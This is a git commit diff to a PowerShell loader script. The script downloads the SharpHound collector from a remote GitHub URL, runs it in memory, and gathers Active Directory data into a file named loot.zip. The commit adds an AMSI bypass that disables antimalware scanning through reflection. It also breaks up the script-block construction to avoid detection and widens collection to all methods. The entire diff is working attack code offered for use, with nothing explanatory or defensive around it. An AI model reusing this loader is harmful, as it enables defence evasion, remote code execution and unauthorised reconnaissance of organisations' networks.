08794a33a4678a242237c2e83134dc0afd142add
Tyler the Pug <50224819+tylerwhardy@users.noreply.github.com>
2025-07-06 20:05:16 -0400

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -1,6 +1,11 @@
-$code = @'
-IEX (([System.Net.WebClient]::new()).DownloadString('https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1'))
-Invoke-BloodHound -CollectionMethod ACL,Trusts,GroupMembership -ZipFileName loot.zip
+$pre = '[ScriptBlock]::Create('
+$mid = @'
+"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
+. ([System.Net.WebClient]::new()).DownloadString('https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1');
+Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip"
 '@
-$sb = [ScriptBlock]::Create($code)
+$post = ')'
+
+$joined = $pre + $mid + $post
+$sb = Invoke-Expression $joined
 & $sb
